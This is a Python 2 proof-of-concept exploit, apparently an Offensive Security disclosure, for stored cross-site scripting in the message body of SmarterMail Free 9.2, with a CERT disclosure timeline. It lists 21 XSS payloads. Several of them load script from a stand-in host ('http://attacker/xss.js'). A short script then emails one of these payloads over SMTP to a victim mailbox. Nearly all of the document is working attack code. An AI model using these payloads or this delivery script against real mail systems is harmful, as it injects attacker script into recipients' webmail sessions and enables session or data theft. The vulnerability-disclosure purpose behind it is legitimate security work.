#!/usr/bin/python

'''

Author: loneferret of Offensive Security
Product: SmarterMail
Version: Free 9.2
Vendor Site: http://www.smartertools.com
Software Download: http://smartertools.com/smartermail/mail-server-software.aspx

Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
23 Jul 2012: Update from CERT. Vendor response: "It looks like a scan was run against an older version of SmarterMail. It would need to be tested against either version 9.4 or 10.0."
08 Aug 2012: Public Disclosure

Installed On: Windows Server 2003 SP2
Client Test OS: Window XP Pro SP3 (x86)
Browser Used: Internet Explorer 8
Client Test OS: Window 7 Pro SP1 (x86)
Browser Used: Internet Explorer 9

Injection Point: Body
Injection Payload(s):
1: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
2: <SCRIPT>alert('XSS')</SCRIPT>
3: <SCRIPT SRC=http://attacker/xss.js></SCRIPT> 
4: <DIV STYLE="width: expression(alert('XSS'));">
5: <SCRIPT a="blah" '' SRC="http://attacker/xss.js"></SCRIPT>
6: <SCRIPT "a='>'" SRC="http://attacker/xss.js"></SCRIPT>
7: <SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>
8: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://attacker/xss.js"></SCRIPT>
9: <SCRIPT a=">'>" SRC="http://attacker/xss.js"></SCRIPT>
10: <SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>
11: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
12: <SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
13: <<SCRIPT>alert("XSS");//<</SCRIPT>
14: <SCRIPT SRC=//attacker/.j>
15: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
16: <HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
17: <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]--
18: <SCRIPT SRC="http://attacker/xss.jpg"></SCRIPT>
19: <XSS STYLE="xss:expression(alert('XSS'))">
20: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"> 
21: exp/*<XSS STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>

'''


import smtplib, urllib2
 
payload = """<SCRIPT SRC=http://attacker/xss.js></SCRIPT>"""
 
def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS" + payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()
 
username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"
 
print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)